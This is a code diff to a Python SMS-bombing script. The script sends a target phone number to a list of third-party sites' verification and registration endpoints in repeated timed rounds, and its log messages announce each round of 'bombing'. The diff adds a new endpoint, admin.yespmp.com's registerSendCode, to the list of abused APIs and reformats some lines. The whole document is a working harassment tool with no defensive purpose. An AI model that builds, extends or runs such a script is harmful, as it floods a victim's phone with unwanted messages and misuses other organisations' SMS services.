@@ -75,7 +75,14 @@ APIS = [
     {
         'url': 'http://www.51sxue.com/index.php',
         'body': {
-            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username':'456dadad'
+            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username': '456dadad'
+        }
+    },
+    # yespmp
+    {
+        'url': 'https://admin.yespmp.com/YespmpWeb/registerSendCode',
+        'body': {
+            'phone': '手机号码'
         }
     },
 ]
@@ -87,7 +94,8 @@ def sendSMS(API, phone):
     }
     if API.get('headers'):
         headers.update(API.get('headers'))
-    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(int(time.time() * 1000)))
+    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(
+        int(time.time() * 1000)))
     body = API.get('body')
     try:
         if body:
@@ -108,9 +116,10 @@ def main(phone):
         for API in APIS:
             sendSMS(API, phone)
             time.sleep(random.randint(1, 3))
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i+1}轮轰炸！")
+        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
         time.sleep(60)
         i += 1
+
 
 if __name__ == '__main__':
     # 手机号
